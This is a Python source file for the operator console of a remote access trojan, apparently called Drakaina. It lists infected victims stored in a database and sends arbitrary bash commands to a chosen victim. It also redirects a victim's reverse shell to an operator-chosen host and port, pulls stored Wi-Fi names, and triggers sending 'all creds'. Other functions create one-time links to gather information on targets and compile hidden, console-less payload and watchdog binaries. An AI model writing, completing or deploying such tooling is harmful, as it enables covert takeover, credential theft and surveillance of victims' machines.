import os
import subprocess
import re
import requests
import apext_db
import platform
import shutil

### TO DO:
### THREADED FUNCTION LOOK FOR NEW USERS IN REALTIME AND UPDATE TO HUDS

### READ SERVER_CONFIG.CFG TO GET IP AND PORT ###
with open("./server.cfg", "r") as cfg:
    ip = '{0}'.format(cfg.readline()[7:].strip())
    port = '{0}'.format(cfg.readline()[5:].strip())

if platform.uname()[0] == "Linux":
    _OS = "linux"



print("""  _____            _         _             
 |  __ \          | |       (_)            
 | |  | |_ __ __ _| | ____ _ _ _ __   __ _ 
 | |  | | '__/ _` | |/ / _` | | '_ \ / _` |
 | |__| | | | (_| |   < (_| | | | | | (_| |
 |_____/|_|  \__,_|_|\_\__,_|_|_| |_|\__,_|
                                           
                                           """)

print(''' please type in a command \n   
/list --list all registered users
/target --target a registered user
/create_link --create a token generated 1 time use dynamic link to gather information on a target.\n
/configure_watchdog -- change master server for watchdog before compiling it.
/compile -- compile python code using Nuitka/ Pyinstaller/ cxfreeze
''')

while 1:
    try:
        MAIN_INPUT = input()
        if MAIN_INPUT == '/list':
            RATLIST = []
            i=0
            for rat in apext_db.get_rat_list():
                RATLIST.append(rat)
                print("{0} -- ".format(i) + "{0}".format( rat))
                i+=1
            i2 = 1
            i = 0
            for rat in RATLIST:
                if i2 == 0:
                    i2 = 0
                    print("({0}) {1} ------ username: {2}".format(i-1, RATLIST[i-1], rat))
                else:
                    i2 +=1
                i+=1
    except Exception as e:
        print(e)
        pass
    
    if MAIN_INPUT == '/target':
        print('What client would you like to target?')
        RAT_IP = input()
        
        CLIENT_LIST = []

        for client in apext_db.get_rat_list():
            CLIENT_LIST.append(client)
        
        print(CLIENT_LIST[int(RAT_IP)])

        CLIENT_IP =  CLIENT_LIST[int(RAT_IP)][0]
        RAT_IP_USER = CLIENT_LIST[int(RAT_IP)][1]
        CLEINT_UUID = CLIENT_LIST[int(RAT_IP)][5]
        
        print(CLIENT_IP)

        print(''' Rat {0} exist choose a command 
/command  #runs a bash command 
/rshell   #attempts a reverse shell
/rshell_show # shows whats server the targets reverse shell wants to connect too.
/reboot    #attempts to send all creds if havent already'''.format(RAT_IP))
        while 1:
                print('---------Enter command')
                command = input()
                if command == '/command':
                    print('please enter the terminal command, no return code or response will be seen.')
                    TERM_CMD = input()
                    apext_db.user_command(CLIENT_IP, RAT_IP_USER, TERM_CMD, CLEINT_UUID)

                if command == "/rshell_show":
                    print(apext_db.get_rshell_master(CLIENT_IP, RAT_IP_USER, CLEINT_UUID))
                    print(apext_db.get_rshell_master_port(CLIENT_IP, RAT_IP_USER, CLEINT_UUID))

                elif command == '/rshell':
                    print('enter ip you want rat ip to connect to port used will be 1337')
                    master_ip = input()
                    print("enter the port.")
                    master_port = input()
                    apext_db.rshell_master(CLIENT_IP, RAT_IP_USER, master_ip, CLEINT_UUID)
                    apext_db.update_rshell_master_port(CLIENT_IP, RAT_IP_USER, master_port, CLEINT_UUID)
                    print('changing masterp ip for this rat')

                elif command == '/getwifi':
                    print(apext_db.get_user_wifi_names(CLEINT_UUID))

                elif command == '/help':
                    print('''

/command  #runs a bash command 
/rshell   #attempts a reverse shell
/reboot    #attempts to send all creds if havent already
/script
/help''')

    if MAIN_INPUT.lower() == '/create_link':
        n = os.urandom(8).hex()
        f = open('tokens', 'a')
        f.write('{0}\n'.format(n))
        f.close()
        print("Dynamic Token Link created : " + "http://{0}:{1}/inf/{2}".format(ip, port, n))

    if MAIN_INPUT.lower() == '/compile':
        print("what compiler would you like to use?\n\n 0) Nuitka \n 1) pyinstaller")
        while 1:
            i = input()
            if i.lower() == "0":
                if _OS == "linux":
                    print("attempting to compile payload and watchdog using Nuitka.")
                    try:
                        os.system("python3 -m nuitka --standalone --onefile --disable-console payload.py")
                        if os.path.exists("./static/linux/payload.bin"):
                            os.remove("./static/linux/payload.bin")
                        shutil.move("./payload.bin", "./static/linux")

                        os.system("python3 -m nuitka --standalone --onefile --disable-console watchdog.py")
                        if os.path.exists("./static/linux/watchdog.bin"):
                            os.remove("./static/linux/watchdog.bin")
                        shutil.move("./watchdog.bin", "./static/linux")

                        print("Task Finished!")

                    except Exception as e:
                        print(e)
                    break

                elif _OS == "windows":
                    ### Check if nuit exists
                    print("checking if nuitka exists")
                    proc = subprocess.Popen(["python -m nuitka --version"], stdout=subprocess.PIPE, shell=True)
                    (out, err) = proc.communicate()
                    if out[1:4] == b".1\n":
                        print('Nuitka seems to be installed')
                    else:
                        print("Nuitka does'nt seem to be installed")
                        ### attempt to install nuitka ###
                        break
                    import time
                    time.sleep(5)
                    print("attempting to compile payload and watchdog using Nuitka.")
                    try:
                        os.system("python3 -m nuitka --onefile --disable-console payload.py")
                        os.system("python3 -m nuitka --onefile --disable-console watchdog.py")
                    except Exception as e:
                        print(e)

    if MAIN_INPUT.lower() == '/configure_watchdog':
        print(""" what would you like to change in watchdog \n
        1) master server ip \n
        2) master server port \n
        3) load payload from memory \n
        4) load payload from disk \n
        5) command check delay in seconds \n
        6) reverse shell check delay in seconds 
        """)
                    
        
